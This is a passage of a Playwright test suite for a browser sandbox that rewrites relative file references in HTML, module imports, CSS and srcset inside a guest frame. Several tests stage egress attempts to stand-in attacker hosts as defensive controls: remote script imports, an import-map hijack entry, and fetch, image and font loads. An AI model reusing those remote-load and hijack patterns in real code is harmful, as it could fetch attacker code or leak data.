        expect(rewritten.head).toBe(verbatim.head);
        expect(rewritten.body).toBe(verbatim.body);
        // a reference inside <template> is not rewritten (out of scope)
        expect(rewritten.template).toBe('<img src="logo.svg">');
    });

    test('an unregistered or differently spelled reference fails closed: the attribute stays as written, the load fails, and no request is made at all', async ({ sandbox }) => {
        // No request recording here: it could show nothing a positive control proves it would see (in
        // Chromium Playwright misses guest-frame requests, T5). The violation channel, with its control, is
        // the evidence that nothing was requested.
        expect(await sandbox.registerFiles({ 'logo.svg': MARKUP_FILES['logo.svg']!, 'app.js': 'window.__app = true;' })).toBe('ok');
        // relative references the host does not match: they stay relative, and cannot resolve in the guest
        const MISSES = ['missing.svg', 'logo.svg?v=1', 'logo.svg#f', 'LOGO.SVG', '%6Cogo.svg', 'img/logo.svg', '../missing.svg'];
        // every element records its own load or error event
        const on = `onload="__events[this.id] = 'load'" onerror="__events[this.id] = 'error'"`;
        const html = `<script>
                window.__v = []; window.__events = {};
                addEventListener('securitypolicyviolation', e => __v.push(e.effectiveDirective + ' ' + e.blockedURI));
            </script>
            <img id="ok" src="logo.svg" ${on}>
            ${MISSES.map((src, i) => `<img id="m${i}" src="${src}" ${on}>`).join('')}
            <img id="control" src="https://attacker.test/x.svg" ${on}>
            <img id="port" src="https://vfs.invalid:8443/logo.svg" ${on}>
            <script id="app" src="app.js" ${on}></script>
            <script id="ms" src="missing.js" ${on}></script>
            <link id="ml" rel="stylesheet" href="missing.css" ${on}>`;
        expect(await sandbox.mount({ html })).toBe('ready');
        const r = await inGuest(sandbox, `
            if (document.readyState !== 'complete') await new Promise(res => addEventListener('load', res, { once: true }));
            await new Promise(res => setTimeout(res, 300)); // violation events are queued as tasks
            return {
                app: window.__app === true,
                attributes: ${JSON.stringify(MISSES)}.every((src, i) => document.getElementById('m' + i).getAttribute('src') === src)
                    && document.getElementById('ms').getAttribute('src') === 'missing.js' && document.getElementById('ml').getAttribute('href') === 'missing.css',
                events: __events,
                sheet: document.getElementById('ml').sheet,
                violations: [...new Set(__v)].sort(),
            };
        `);
        const misses = Object.fromEntries(MISSES.map((_, i) => [`m${i}`, 'error']));
        // positive controls: a reference to a registered file loads (the outcome channel), and a request
        // the policy refuses is reported (the violation channel)
        expect(r).toEqual({
            app: true,
            attributes: true,
            // a <link> whose URL does not resolve fetches nothing and fires no event, in every engine
            events: { ok: 'load', ...misses, control: 'error', port: 'error', app: 'load', ms: 'error' },
            sheet: null,
            // Every relative miss failed WITHOUT a violation. The policy admits only blob: for images and
            // scripts, so a request for any other URL would have been refused with a violation, as the
            // control's and the absolute vfs.invalid URL's are (an absolute URL that names no registered
            // file is left as written, and the policy refuses it); failing without one means the URL never
            // resolved, so nothing was requested (the guest's base is about:blank).
            violations: ['img-src https://attacker.test/x.svg', 'img-src https://vfs.invalid:8443/logo.svg'],
        });
    });
});

test.describe('9. module graph: relative imports between registered modules resolve through one import map (iframe mode)', () => {
    // A graph across directories: './', '../' and '/' specifiers, export * from, export { } from, a
    // side-effect import, a literal import(), '..' above the root, and import-like text the rewrite must
    // not touch. counter.js counts its evaluations: it is reached from markup (by blob: URL) and from
    // several modules (by virtual URL), and must be evaluated once.
    const GRAPH: Record<string, FileSpec> = {
        'app/main.js': [
            "import { a } from './lib/a.js';",
            "import { b } from '../shared/b.js';",
            'import { c } from "/shared/c.js";',
            "import './side.js';",
            "export * from './lib/reexport.js';",
            "export { d } from './lib/d.js';",
            "globalThis.__mainEvaluations = (globalThis.__mainEvaluations || 0) + 1;",
            "export const out = a + b + c;",
            "export const lazy = () => import('./lib/lazy.js').then(m => m.lazy);",
            "// import './comment.js'",
            "export const untouched = [\"import './string.js'\", /import '.\\/regex.js'/.source, `import './template.js'`];",
        ].join('\n'),
        'app/lib/a.js': "import { b } from '../../shared/b.js'; import '../../shared/counter.js'; export const a = 'a' + b;",
        'app/lib/reexport.js': "export const re = 're';",
        'app/lib/d.js': "export const d = 'd';",
        'app/lib/lazy.js': "import { count } from '/shared/counter.js'; export const lazy = 'lazy' + count;",
        'app/side.js': "globalThis.__side = (globalThis.__side || 0) + 1;",
        'app/up.js': "import { b } from '../../../../shared/b.js'; export const up = 'up' + b;",
        'shared/b.js': "export const b = 'b';",
        'shared/c.js': "import { count } from './counter.js'; export const c = 'c' + count;",
        'shared/counter.js': "globalThis.__counterEvaluations = (globalThis.__counterEvaluations || 0) + 1; export const count = globalThis.__counterEvaluations;",
    };

    const GRAPH_DOCUMENT = `<script>
            window.__violations = [];
            addEventListener('securitypolicyviolation', e => __violations.push(e.effectiveDirective + ' ' + e.blockedURI));
        </script>
        <script type="module" src="shared/counter.js"></script>
        <script type="module" src="app/main.js"></script>
        <script type="module">
            import { out, re, d, lazy, untouched } from './app/main.js';
            import { up } from './app/up.js';
            import { count } from '/shared/counter.js';
            globalThis.__inline = { out, re, d, lazy: await lazy(), up, count, untouched };
        </script>`;

    const READ_GRAPH = `
        for (let i = 0; i < 100 && !globalThis.__inline; i++) await new Promise(res => setTimeout(res, 20));
        await new Promise(res => setTimeout(res, 100)); // violation events are queued as tasks
        const viaMarkup = await import(sandboxFiles.url('app/main.js'));
        return {
            inline: globalThis.__inline,
            evaluations: { main: __mainEvaluations, counter: __counterEvaluations, side: __side },
            sameModule: viaMarkup.out === __inline.out && (await import(sandboxFiles.url('shared/counter.js'))).count === 1,
            violations: __violations,
            importMaps: document.querySelectorAll('script[type=importmap]').length,
            registered: await sandboxFiles.text('app/main.js'),
            delivered: await (await fetch(sandboxFiles.url('app/main.js'))).text(),
        };
    `;

    test('a graph across directories loads from markup <script type=module src> and from an inline module: ./, ../ and / specifiers, export * from, export from, side-effect import, literal import(), .. clamped at the root; a module reached by blob: URL and by virtual URL is evaluated once; no violation', async ({ sandbox }) => {
        expect(await sandbox.registerFiles(GRAPH)).toBe('ok');
        expect(await sandbox.mount({ html: GRAPH_DOCUMENT })).toBe('ready');
        const r = await inGuest(sandbox, READ_GRAPH);
        expect(r.inline).toEqual({
            out: 'abbc1', re: 're', d: 'd', lazy: 'lazy1', up: 'upb', count: 1,
            untouched: ["import './string.js'", "import '.\\/regex.js'", "import './template.js'"],
        });
        expect(r.evaluations).toEqual({ main: 1, counter: 1, side: 1 });
        expect(r.sameModule).toBe(true);
        expect(r.violations).toEqual([]);
        // the map was registered and its element removed: the guest document has none
        expect(r.importMaps).toBe(0);
        // read()/text() return the file as registered; the URL serves the rewritten module
        expect(r.registered).toBe(GRAPH['app/main.js']);
        expect(r.delivered).toContain(`import { a } from "https://vfs.invalid/app/lib/a.js";`);
        expect(r.delivered).toContain(`import { c } from "https://vfs.invalid/shared/c.js";`);
        expect(r.delivered).toContain(`import("https://vfs.invalid/app/lib/lazy.js")`);
        expect(r.delivered).toContain(`// import './comment.js'`);
    });

    test('unsupported forms fail closed with no request: computed import() of a relative path, new URL(..., import.meta.url), a scheme-relative specifier; a relative import of an unregistered file is refused by the policy', async ({ sandbox }) => {
        expect(await sandbox.registerFiles({
            'u/b.js': "export const b = 'b';",
            'u/computed.js': "const name = 'b.js'; export const r = import('./' + name).then(m => 'loaded:' + m.b, e => 'error:' + e.name);",
            'u/meta.js': "let r; try { r = new URL('./b.js', import.meta.url).href; } catch (e) { r = 'throws:' + e.name; } export const meta = r; export const metaUrl = import.meta.url.startsWith('blob:null/') ? 'blob:null' : import.meta.url;",
            'u/scheme-relative.js': "export const r = import('//attacker.test/x.js').then(() => 'loaded', e => 'error:' + e.name);",
            'u/missing.js': "export const r = import('./not-registered.js').then(() => 'loaded', e => 'error:' + e.name);",
        })).toBe('ok');
        expect(await sandbox.mount()).toBe('ready');
        const r = await inGuest(sandbox, `
            const violations = [];
            addEventListener('securitypolicyviolation', e => violations.push(e.effectiveDirective + ' ' + e.blockedURI));
            const load = (path) => import(sandboxFiles.url(path));
            const r = {
                computed: await (await load('u/computed.js')).r,
                meta: (await load('u/meta.js')).meta,
                metaUrl: (await load('u/meta.js')).metaUrl,
                schemeRelative: await (await load('u/scheme-relative.js')).r,
                missing: await (await load('u/missing.js')).r,
                schemeRelativeSource: (await (await fetch(sandboxFiles.url('u/scheme-relative.js'))).text()).includes("import('//attacker.test/x.js')"),
            };
            await new Promise(res => setTimeout(res, 200)); // violation events are queued as tasks
            r.violations = [...new Set(violations)].sort();
            return r;
        `);
        expect(r).toEqual({
            computed: 'error:TypeError',
            meta: 'throws:TypeError',
            metaUrl: 'blob:null',
            schemeRelative: 'error:TypeError',
            missing: 'error:TypeError',
            schemeRelativeSource: true,
            // the only violation is the rewritten import of an unregistered file (positive control for
            // the violation channel): the other three failed without any request
            violations: ['script-src-elem https://vfs.invalid/u/not-registered.js'],
        });
    });

    test("the guest's own inline import map is merged into ours and taken out of the markup, the same in every engine: its entries apply, ours win on the files' virtual URLs, an invalid map is left out", async ({ sandbox }) => {
        expect(await sandbox.registerFiles({ 'app/x.js': "export const x = 'ours';" })).toBe('ok');
        const document = (guestMap: string) => `<script>
                window.__violations = [];
                addEventListener('securitypolicyviolation', e => __violations.push(e.effectiveDirective + ' ' + e.blockedURI));
            </script>
            <script type="importmap">${guestMap}</script>
            <script type="module">
                import { x } from './app/x.js';
                globalThis.__x = x;
                globalThis.__cdn = await import('cdn-lib').then(() => 'loaded', e => 'error:' + e.name);
            </script>`;
        const read = `
            for (let i = 0; i < 100 && !globalThis.__cdn; i++) await new Promise(res => setTimeout(res, 20));
            await new Promise(res => setTimeout(res, 200));
            return { x: globalThis.__x, cdn: globalThis.__cdn, violations: [...new Set(__violations)].sort(), importMaps: document.querySelectorAll('script[type=importmap]').length };
        `;

        // A valid guest map, which in Firefox would be ignored if it stayed in the markup after ours.
        expect(await sandbox.mount({ html: document(JSON.stringify({ imports: {
            'cdn-lib': 'https://attacker.test/lib.js',
            'https://vfs.invalid/app/x.js': 'https://attacker.test/hijack.js',
        } })) })).toBe('ready');
        expect(await inGuest(sandbox, read)).toEqual({
            x: 'ours',
            cdn: 'error:TypeError',
            // the guest's entry applied (the bare specifier was mapped, then refused by the policy);
            // its entry for our virtual URL did not (no request for hijack.js)
            violations: ['script-src-elem https://attacker.test/lib.js'],
            importMaps: 0,
        });

        // An invalid guest map is left out; ours still applies, and the bare specifier stays unmapped.
        expect(await sandbox.load(document('{ not json'))).toBe('ready');
        expect(await inGuest(sandbox, read)).toEqual({ x: 'ours', cdn: 'error:TypeError', violations: [], importMaps: 0 });
    });

    test('a module graph adds no egress: modules run under the guest policy, every attempt to reach a non-allowlisted origin is refused AND reported (T5)', async ({ sandbox }) => {
        // the listener outside the browser must stay silent; its positive control is section 4's last test
        const ATTACKER = recorder.blocked;
        expect(await sandbox.registerFiles({
            'egress/main.js': `import { own } from './own.js';
                export const outcomes = (async () => ({
                    own,
                    import: await import('${ATTACKER}/m.js').then(() => 'reached', () => 'refused'),
                    fetch: await fetch('${ATTACKER}/f').then(() => 'reached', () => 'refused'),
                    img: await new Promise(res => { const i = new Image(); i.onload = () => res('reached'); i.onerror = () => res('refused'); i.src = '${ATTACKER}/i.svg'; }),
                }))();`,
            'egress/own.js': "export const own = 'reached';",
        })).toBe('ok');
        expect(await sandbox.mount({ html: `<script>
                window.__violations = [];
                addEventListener('securitypolicyviolation', e => __violations.push(e.effectiveDirective + ' ' + e.blockedURI));
            </script>
            <script type="module">import { outcomes } from './egress/main.js'; globalThis.__outcomes = await outcomes;</script>` })).toBe('ready');
        const r = await inGuest(sandbox, `
            for (let i = 0; i < 100 && !globalThis.__outcomes; i++) await new Promise(res => setTimeout(res, 20));
            await new Promise(res => setTimeout(res, 300));
            return { outcomes: globalThis.__outcomes, violations: [...new Set(__violations)].sort() };
        `);
        // positive control for the outcome channel: the graph's own import is reached
        expect(r.outcomes).toEqual({ own: 'reached', import: 'refused', fetch: 'refused', img: 'refused' });
        // every refusal has its violation, so a request that left and merely failed would show up here
        expect(r.violations).toEqual([
            `connect-src ${ATTACKER}/f`,
            `img-src ${ATTACKER}/i.svg`,
            `script-src-elem ${ATTACKER}/m.js`,
        ]);
        expect(recorder.paths('blocked')).toEqual([]);
    });

    test('worker mode is classic only: importScripts and read() work as before, read() returns the file as registered, and a rewritten module graph fails closed (no import map in workers)', async ({ sandbox }) => {
        const main = "import { b } from './b.js'; export const out = b;";
        expect(await sandbox.registerFiles({
            'w/classic.js': "globalThis.__classic = 'ran';",
            'w/main.js': main,
            'w/b.js': "export const b = 'b';",
        })).toBe('ok');
        expect(await sandbox.mount({ mode: 'worker' })).toBe('ready');
        const r = await inGuest(sandbox, `
            importScripts(sandboxFiles.url('w/classic.js'));
            return {
                scope: typeof document === 'undefined' ? 'worker' : 'document',
                classic: globalThis.__classic,
                leaf: (await import(sandboxFiles.url('w/b.js'))).b,
                graph: await import(sandboxFiles.url('w/main.js')).then(m => 'loaded:' + m.out, e => 'error:' + e.name),
                registered: await sandboxFiles.text('w/main.js'),
            };
        `);
        expect(r).toEqual({ scope: 'worker', classic: 'ran', leaf: 'b', graph: 'error:TypeError', registered: main });
    });
});

test.describe('10. CSS references and srcset: stylesheets and inline styles name files by url() and @import, srcset by candidate (iframe mode)', () => {
    const FONT = { base64: FONT_WOFF2_B64 };
    const SVG = (w: number, h: number) => `<svg xmlns="http://www.w3.org/2000/svg" width="${w}" height="${h}"></svg>`;

    // Measured per engine (2026-10-13), like the blob delivery probe: a <link> whose sheet has an @import
    // that names nothing (a relative URL left as written cannot resolve against a blob: base) fires
    // 'error' in Chromium and WebKit and 'load' in Firefox; the sheet's own rules apply in all three. An
    // <img> whose only srcset candidate cannot resolve fires 'error' in Chromium and WebKit and no event
    // in Firefox. Either way nothing loads and nothing is requested. What such an @import rule exposes
    // as its sheet differs too: a sheet whose rules are unreadable (Chromium), an empty sheet (Firefox),
    // no sheet (WebKit).
    const UNRESOLVED_IMPORT_EVENT = { chromium: 'error', firefox: 'load', webkit: 'error' } as const;
    const UNRESOLVED_IMPORT_SHEET = { chromium: 'SecurityError', firefox: 0, webkit: 'none' } as const;
    const UNRESOLVED_SRCSET_EVENT = { chromium: 'error', firefox: undefined, webkit: 'error' } as const;

    // Collects violations and the load/error event of every element that has an id, from the first
    // parsed script on: the evidence channels of this section (T5).
    const PRELUDE = `<script>
            window.__v = []; window.__events = {};
            addEventListener('securitypolicyviolation', e => __v.push(e.effectiveDirective + ' ' + e.blockedURI));
            // on the document: a load event never propagates to the window (DOM, "get the parent")
            document.addEventListener('load', e => { if (e.target.id) __events[e.target.id] = 'load'; }, true);
            document.addEventListener('error', e => { if (e.target.id) __events[e.target.id] = 'error'; }, true);
        </script>`;
    // Guest helpers: the document has loaded (every <link>, @import and <img> settled), a face's load outcome.
    const LOADED = `
        if (document.readyState !== 'complete') await new Promise(res => addEventListener('load', res, { once: true }));
        const face = async (family) => {
            await document.fonts.load('16px ' + family).catch(() => {});
            const f = [...document.fonts].find(f => f.family.replace(/["']/g, '') === family);
            return f ? f.status : 'missing';
        };
        const cssUrl = (path) => 'url("' + sandboxFiles.url(path) + '")';
        // What an @import rule's sheet exposes: its rule count, 'none' without a sheet, 'unreadable' when
        // the engine refuses access (Chromium, for an import whose URL did not resolve).
        const imported = (rule) => { if (!rule.styleSheet) return 'none'; try { return rule.styleSheet.cssRules.length; } catch (e) { return e.name; } };
        const settle = async (expected) => {
            for (let i = 0; i < 100 && !expected.every(x => __v.includes(x)); i++) await new Promise(res => setTimeout(res, 50));
            await new Promise(res => setTimeout(res, 300)); // violation events are queued as tasks
            return [...new Set(__v)].sort();
        };
    `;

    test('a registered stylesheet linked from markup loads the image and the font its url() references name, by ../ and quoted paths; read() keeps the bytes as registered; no violation', async ({ sandbox }) => {
        const SITE = [
            '@font-face { font-family: sitefont; src: url("../fonts/f.woff2") format("woff2"), local("No Such Font"); }',
            '/* url(../img/commented.svg) */',
            '#probe { background-image: url( ../img/bg.svg ); content: "../img/bg.svg"; }',
        ].join('\n');
        expect(await sandbox.registerFiles({ 'css/site.css': SITE, 'fonts/f.woff2': FONT, 'img/bg.svg': SVG(7, 9) })).toBe('ok');
        expect(await sandbox.mount({ html: `${PRELUDE}<link id="l" rel="stylesheet" href="css/site.css"><div id="probe"></div>` })).toBe('ready');
        const r = await inGuest(sandbox, `${LOADED}
            const rules = document.getElementById('l').sheet.cssRules;
            const background = rules[1].style.backgroundImage;
            const image = await new Promise(res => { const i = new Image(); i.onload = () => res(i.naturalWidth + 'x' + i.naturalHeight); i.onerror = () => res('error'); i.src = background.slice(5, -2); });
            return {
                link: __events.l,
                background: background === cssUrl('img/bg.svg'),
                image,
                fontSrc: rules[0].style.getPropertyValue('src').includes(sandboxFiles.url('fonts/f.woff2')),
                font: await face('sitefont'),
                registered: await sandboxFiles.text('css/site.css'),
                delivered: await (await fetch(sandboxFiles.url('css/site.css'))).text(),
                expected: ${JSON.stringify(SITE)}.replace('"../fonts/f.woff2"', JSON.stringify(sandboxFiles.url('fonts/f.woff2'))).replace(' ../img/bg.svg ', JSON.stringify(sandboxFiles.url('img/bg.svg'))),
                violations: await settle([]),
            };
        `);
        expect(r).toEqual({
            link: 'load', background: true, image: '7x9', fontSrc: true, font: 'loaded',
            registered: SITE, delivered: r.expected, expected: r.expected, violations: [],
        });
        // what the comment and the string said is not a reference: left as written
        expect(r.delivered).toContain('/* url(../img/commented.svg) */');
        expect(r.delivered).toContain('content: "../img/bg.svg"');
    });

    test('an @import chain two levels deep applies every level: each stylesheet is made after the ones it imports', async ({ sandbox }) => {
        expect(await sandbox.registerFiles({
            'theme/main.css': '@import "parts/base.css";\n#a { width: 11px; }',
            'theme/parts/base.css': '@import url(../../shared/reset.css);\n#b { width: 12px; }',
            'shared/reset.css': '#c { width: 13px; }',
        })).toBe('ok');
        expect(await sandbox.mount({ html: `${PRELUDE}<link id="l" rel="stylesheet" href="theme/main.css">` })).toBe('ready');
        const r = await inGuest(sandbox, `${LOADED}
            const main = document.getElementById('l').sheet;
            const base = main.cssRules[0].styleSheet;
            const reset = base && base.cssRules[0].styleSheet;
            return {
                link: __events.l,
                hrefs: [main.cssRules[0].href === sandboxFiles.url('theme/parts/base.css'), base.cssRules[0].href === sandboxFiles.url('shared/reset.css')],
                widths: [main.cssRules[1].style.width, base.cssRules[1].style.width, reset && reset.cssRules[0].style.width],
                violations: await settle([]),
            };
        `);
        expect(r).toEqual({ link: 'load', hrefs: [true, true], widths: ['11px', '12px', '13px'], violations: [] });
    });

    test('an @import cycle fails closed without hanging: the references on the cycle stay as written and load nothing, every other rule and import applies, and the page stays responsive', async ({ sandbox, browserName }) => {
        const A = '@import "b.css";\n@import "../leaf.css";\n#ca { width: 21px; }';
        const B = '@import "a.css";\n#cb { width: 22px; }';
        const SELF = '@import "self.css";\n#cs { width: 24px; }';
        expect(await sandbox.registerFiles({ 'cycle/a.css': A, 'cycle/b.css': B, 'leaf.css': '#leaf { width: 23px; }', 'self.css': SELF })).toBe('ok');
        const boxes = ['ca', 'cb', 'cs', 'leaf'].map(id => `<div id="${id}"></div>`).join('');
        expect(await sandbox.mount({ html: `${PRELUDE}<link id="la" rel="stylesheet" href="cycle/a.css"><link id="lb" rel="stylesheet" href="cycle/b.css"><link id="ls" rel="stylesheet" href="self.css">${boxes}` })).toBe('ready');
        const r = await inGuest(sandbox, `${LOADED}
            const sheet = (id) => document.getElementById(id).sheet;
            // an import left as written keeps its href, and names nothing in a blob: stylesheet
            const empty = (rule, href) => rule.href === href && imported(rule) === ${JSON.stringify(UNRESOLVED_IMPORT_SHEET[browserName])} ? true : { href: rule.href, imported: imported(rule) };
            const a = sheet('la'), b = sheet('lb'), s = sheet('ls');
            const delivered = async (path) => (await fetch(sandboxFiles.url(path))).text();
            const started = performance.now();
            await new Promise(res => setTimeout(res, 0));
            return {
                events: __events,
                a: { cyclic: empty(a.cssRules[0], 'b.css'), leaf: a.cssRules[1].styleSheet.cssRules[0].style.width, own: a.cssRules[2].style.width },
                b: { cyclic: empty(b.cssRules[0], 'a.css'), own: b.cssRules[1].style.width },
                self: { cyclic: empty(s.cssRules[0], 'self.css'), own: s.cssRules[1].style.width },
                // applied, not only parsed: read once the document has loaded (section 8)
                applied: ['ca', 'cb', 'cs', 'leaf'].map(id => getComputedStyle(document.getElementById(id)).width),
                delivered: { a: await delivered('cycle/a.css'), b: await delivered('cycle/b.css'), self: await delivered('self.css') },
                leafUrl: sandboxFiles.url('leaf.css'),
                responsive: performance.now() - started < 5000,
                violations: await settle([]),
            };
        `);
        const event = UNRESOLVED_IMPORT_EVENT[browserName];
        expect(r.events).toEqual({ la: event, lb: event, ls: event });
        expect(r.applied).toEqual(['21px', '22px', '24px', '23px']);
        expect(r.a).toEqual({ cyclic: true, leaf: '23px', own: '21px' });
        expect(r.b).toEqual({ cyclic: true, own: '22px' });
        expect(r.self).toEqual({ cyclic: true, own: '24px' });
        // the references on the cycle are delivered as registered; the one off the cycle is a blob: URL
        expect(r.delivered).toEqual({ a: A.replace('"../leaf.css"', JSON.stringify(r.leafUrl)), b: B, self: SELF });
        expect(r.responsive).toBe(true);
        expect(r.violations).toEqual([]);
    });

    test('inline <style> and style="" in guest markup name files by url() and @import, resolved against the virtual index.html', async ({ sandbox }) => {
        expect(await sandbox.registerFiles({ 'img/bg.svg': SVG(7, 9), 'fonts/f.woff2': FONT, 'shared/reset.css': '#c { width: 13px; }' })).toBe('ok');
        const html = `${PRELUDE}<style id="s">@import "./shared/reset.css";
                @font-face { font-family: inlinefont; src: url('/fonts/f.woff2'); }
                #i1 { background-image: url(img/bg.svg); }</style>
            <div id="i1"></div><div id="i2" style="background-image: url(img/bg.svg); width: 3px"></div>`;
        expect(await sandbox.mount({ html })).toBe('ready');
        const r = await inGuest(sandbox, `${LOADED}
            const rules = document.getElementById('s').sheet.cssRules;
            const i2 = document.getElementById('i2');
            return {
                imported: rules[0].href === sandboxFiles.url('shared/reset.css') && rules[0].styleSheet.cssRules[0].style.width,
                font: await face('inlinefont'),
                rule: rules[2].style.backgroundImage === cssUrl('img/bg.svg'),
                attribute: i2.style.backgroundImage === cssUrl('img/bg.svg') && i2.style.width,
                stray: document.documentElement.outerHTML.includes('vfs-slot-'),
                violations: await settle([]),
            };
        `);
        expect(r).toEqual({ imported: '13px', font: 'loaded', rule: true, attribute: '3px', stray: false, violations: [] });
    });

    test('srcset on img and picture source: a candidate that names a file loads from its blob: URL; one that names none stays as written', async ({ sandbox, browserName }) => {
        expect(await sandbox.registerFiles({ 'img/bg.svg': SVG(7, 9), 'img/x.svg': SVG(5, 3) })).toBe('ok');
        // one candidate each, so the choice does not depend on the device pixel ratio
        const html = `${PRELUDE}<img id="s1" srcset="img/bg.svg 1x">
            <picture><source id="src" srcset="./img/x.svg" type="image/svg+xml"><img id="s2" src="missing.svg"></picture>
            <img id="s3" srcset="missing.svg 1x, img/bg.svg?v=2 2x">`;
        expect(await sandbox.mount({ html })).toBe('ready');
        const r = await inGuest(sandbox, `${LOADED}
            const img = (id) => { const i = document.getElementById(id); return { event: __events[id], current: i.currentSrc, size: i.naturalWidth + 'x' + i.naturalHeight }; };
            return {
                s1: img('s1'), s2: img('s2'), s3: { ...img('s3'), srcset: document.getElementById('s3').getAttribute('srcset') },
                urls: { bg: sandboxFiles.url('img/bg.svg'), x: sandboxFiles.url('img/x.svg') },
                violations: await settle([]),
            };
        `);
        expect(r.s1).toEqual({ event: 'load', current: r.urls.bg, size: '7x9' });
        expect(r.s2).toEqual({ event: 'load', current: r.urls.x, size: '5x3' });
        // the document's load event waits for every image, so 0x0 after it means the load failed
        expect(r.s3.event).toBe(UNRESOLVED_SRCSET_EVENT[browserName]);
        expect(r.s3).toMatchObject({ size: '0x0', srcset: 'missing.svg 1x, img/bg.svg?v=2 2x' });
        expect(r.violations).toEqual([]);
    });

    test('unregistered, queried and differently spelled references in a stylesheet, an inline style and srcset fail closed: left as written, nothing loads, and no request is made', async ({ sandbox, browserName }) => {
        const BLOCKED = recorder.blocked;
        const MISSES = ['missing.svg', 'logo.svg?v=1', 'logo.svg#f', 'LOGO.SVG', '%6Cogo.svg'];
        const rules = (prefix: string, control: string) => [
            ...MISSES.map((url, i) => `#${prefix}${i} { background-image: url(${JSON.stringify(url)}); }`),
            `#${prefix}ok { background-image: url(logo.svg); }`,
            // positive control for the violation channel: the same kind of load, to a refused origin
            `#${prefix}control { background-image: url(${control}); }`,
        ].join('\n');
        const SHEET = `@import "missing.css";\n${rules('f', `${BLOCKED}/sheet.svg`)}`;
        expect(await sandbox.registerFiles({ 'logo.svg': SVG(7, 9), 'fc.css': SHEET })).toBe('ok');
        const boxes = (prefix: string) => [...MISSES.map((_, i) => `${prefix}${i}`), `${prefix}ok`, `${prefix}control`]
            .map(id => `<div id="${id}" style="width: 10px; height: 10px"></div>`).join('');
        const html = `${PRELUDE}<link id="l" rel="stylesheet" href="fc.css">
            <style id="s">${rules('n', `${BLOCKED}/inline.svg`)}</style>
            ${boxes('f')}${boxes('n')}
            ${MISSES.map((url, i) => `<div id="a${i}" style="width: 10px; height: 10px; background-image: url('${url}')"></div>`).join('')}
            <img id="srcset" srcset="missing.svg 1x">`;
        expect(await sandbox.mount({ html })).toBe('ready');
        const r = await inGuest(sandbox, `${LOADED}
            const sheetRules = document.getElementById('l').sheet.cssRules;
            const inlineRules = document.getElementById('s').sheet.cssRules;
            const misses = ${JSON.stringify(MISSES)};
            return {
                link: __events.l,
                srcset: __events.srcset,
                // the import is left as written and names nothing; the rest of the sheet applies
                importLoaded: sheetRules[0].href !== 'missing.css' || imported(sheetRules[0]) !== ${JSON.stringify(UNRESOLVED_IMPORT_SHEET[browserName])},
                // positive control for the outcome channel: the matched reference names the file's blob: URL
                ok: [sheetRules[1 + misses.length].style.backgroundImage === cssUrl('logo.svg'), inlineRules[misses.length].style.backgroundImage === cssUrl('logo.svg')],
                written: misses.every((url, i) => !sheetRules[1 + i].style.backgroundImage.includes('blob:')
                    && !inlineRules[i].style.backgroundImage.includes('blob:')
                    && !document.getElementById('a' + i).style.backgroundImage.includes('blob:')),
                violations: await settle(['img-src ${BLOCKED}/sheet.svg', 'img-src ${BLOCKED}/inline.svg']),
            };
        `);
        expect(r).toEqual({
            link: UNRESOLVED_IMPORT_EVENT[browserName],
            srcset: UNRESOLVED_SRCSET_EVENT[browserName],
            importLoaded: false,
            ok: [true, true],
            written: true,
            // Only the controls. The policy admits only blob: for images, so a request for any other URL
            // would have been refused with a violation like theirs: the misses never resolved to a URL.
            violations: [`img-src ${BLOCKED}/inline.svg`, `img-src ${BLOCKED}/sheet.svg`],
        });
        expect(recorder.paths('blocked')).toEqual([]);
    });

    test('a rewritten stylesheet adds no egress: its loads to a non-allowlisted origin are refused AND reported, while its own references load (T5)', async ({ sandbox }) => {
        const BLOCKED = recorder.blocked;
        expect(await sandbox.registerFiles({
            'egress/sheet.css': [
                '@font-face { font-family: own; src: url(../fonts/f.woff2); }',
                `@font-face { font-family: away; src: url(${BLOCKED}/f.woff2); }`,
                `#e1 { width: 10px; height: 10px; background-image: url(${BLOCKED}/e.svg); }`,
                '#e2 { width: 10px; height: 10px; background-image: url(../img/bg.svg); }',
            ].join('\n'),
            'egress/import.css': `@import url(${BLOCKED}/i.css);\n@import "../shared/reset.css";`,
            'shared/reset.css': '#c { width: 13px; }',
            'fonts/f.woff2': FONT,
            'img/bg.svg': SVG(7, 9),
        })).toBe('ok');
        expect(await sandbox.mount({ html: `${PRELUDE}<link id="sheet" rel="stylesheet" href="egress/sheet.css"><link id="import" rel="stylesheet" href="egress/import.css"><div id="e1"></div><div id="e2"></div>` })).toBe('ready');
        const r = await inGuest(sandbox, `${LOADED}
            return {
                events: __events,
                // outcome channel: the sheet's own font loads (positive control), the refused one does not
                fonts: { own: await face('own'), away: await face('away') },
                violations: await settle(['font-src ${BLOCKED}/f.woff2', 'img-src ${BLOCKED}/e.svg', 'style-src-elem ${BLOCKED}/i.css']),
            };
        `);
        // a refused @import fails its whole sheet (an error event) in all three engines, as in section 4
        expect(r.events).toEqual({ sheet: 'load', import: 'error' });
        expect(r.fonts).toEqual({ own: 'loaded', away: 'error' });
        // every refusal has its violation, so a request that left and merely failed would show up here
        expect(r.violations).toEqual([`font-src ${BLOCKED}/f.woff2`, `img-src ${BLOCKED}/e.svg`, `style-src-elem ${BLOCKED}/i.css`]);
        expect(recorder.paths('blocked')).toEqual([]);
    });
});
